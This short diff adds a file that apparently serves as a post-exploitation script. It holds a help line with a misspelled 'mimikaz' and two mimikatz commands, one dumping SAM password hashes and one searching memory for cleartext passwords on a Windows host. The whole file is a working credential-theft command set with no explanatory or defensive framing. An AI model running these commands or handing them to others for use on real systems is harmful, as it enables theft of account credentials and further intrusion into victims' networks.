@@ -1,0 +1,5 @@
+
+help mimikaz
+
+mimikatz_command -f samdump::hashes
+mimikatz_command -f sekurlsa::searchPasswords
